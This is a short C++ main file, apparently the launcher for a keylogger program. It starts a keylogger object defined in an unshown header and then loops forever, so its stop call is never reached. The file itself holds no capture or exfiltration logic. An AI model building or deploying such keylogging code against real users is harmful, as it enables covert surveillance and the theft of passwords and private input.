#include <iostream>

#include "keylogger.h"

int main(int argc, char** argv) {
	Keyboard keyboard{};
	Keylogger* keylogger = keyboard.keylogger;

	keylogger->startKeylog();
	while (true) {
		;
	}
	keylogger->stopKeylog();
	return 0;
}